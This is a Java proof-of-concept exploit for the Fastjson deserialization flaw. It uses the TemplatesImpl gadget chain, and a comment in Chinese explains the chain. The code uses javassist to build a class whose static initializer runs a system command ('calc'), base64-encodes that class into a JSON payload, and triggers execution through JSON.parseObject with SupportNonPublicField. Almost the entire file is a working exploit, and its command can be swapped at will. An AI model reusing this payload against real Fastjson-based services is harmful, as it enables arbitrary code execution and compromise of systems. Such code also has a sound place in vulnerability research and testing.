package com.liam.vulnerability;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.ClassPool;
import javassist.CtClass;


import java.util.Base64;
/*
    TemplatesImpl 利用链思路
        1.构造 TemplatesImpl 类的反序列化字符串， TemplatesImpl 的父类为 AbstractTranslet
            _bytecodes：为恶意类字节码
        2.AbstractTranslet 该类会被加载并使用  newInstance() 进行实例化。
        3.在反序列化的过程中，由于getter方法 的 getOutputProperties() 满足条件，将会被FastJson调用。
        4.这个方法触发了整个漏洞
            getOutputProperties() -> newTransformer() -> getTransletInstance() -> defineTransletClasses() ->EvilClass.newInstance()
            限制条件：Feature.SupportNonPublicField
 */
public class POC {
    public static class test{
    }

    public static void main(String[] args) throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass cc = pool.get(test.class.getName());

        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";

        cc.makeClassInitializer().insertBefore(cmd);

        String randomClassName = "LIAM" + System.nanoTime();
        cc.setName(randomClassName);

        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));

        try {
            byte[] evilCode = cc.toBytecode();
            String evilCode_base64 = Base64.getEncoder().encodeToString(evilCode);

            final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
            String text =  "{"+
                    "\"@type\":\"" + NASTY_CLASS +"\","+
                    "\"_bytecodes\":[\""+evilCode_base64+"\"],"+
                    "'_name':'Liam',"+
                    "'_tfactory':{ },"+
                    "'_outputProperties':{ }"+
                    "}\n";
            ParserConfig config = new ParserConfig();
            Object object = JSON.parseObject(text, Object.class, config, Feature.SupportNonPublicField);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
